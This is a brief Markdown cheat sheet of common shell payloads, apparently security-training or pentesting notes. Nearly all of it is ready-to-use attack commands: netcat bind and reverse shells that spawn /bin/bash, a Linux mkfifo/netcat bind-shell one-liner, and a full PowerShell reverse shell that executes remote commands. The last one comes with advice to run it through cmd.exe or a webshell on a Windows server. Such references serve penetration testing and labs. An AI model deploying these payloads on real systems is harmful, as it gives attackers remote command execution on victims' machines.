# Common shell payloads

## Examples

### Windows

In some versions of netcat (including the `nc.exe` Windows version included with Kali at 
`/usr/share/windows-resources/binaries`, and the version used in Kali itself) there is a `-e` option which allows 
for executing a process on connection:

    nc -lvnp <port-number> -e /bin/bash

Connecting to the above listener with netcat would result in a bind shell on the target.

For a reverse shell, connect back with:

    nc <IP address attack machine> <port-number> -e /bin/bash

### Linux

On Linux, use this code to create a listener for a bind shell:

    mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

### Windows server

The standard one-liner PSH reverse shell:

```text
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Copy into a `cmd.exe` shell or another method of executing commands on a Windows server, such as a webshell. 

## Resources

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)